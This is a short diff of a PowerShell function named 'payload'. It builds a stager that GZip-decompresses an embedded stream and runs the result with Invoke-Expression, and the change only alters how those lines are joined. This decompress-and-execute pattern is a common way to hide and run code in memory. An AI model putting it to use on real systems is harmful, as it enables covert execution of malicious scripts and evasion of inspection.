@@ -43,7 +43,7 @@ function payload {
         '$cs = New-Object System.IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]"Decompress")'
         '$sr = New-Object System.IO.StreamReader($cs)'
         '$sr.ReadToEnd() | Invoke-Expression'
-      ) -join ';'
+      ) | Out-String
     }
     return $vmscript
 }
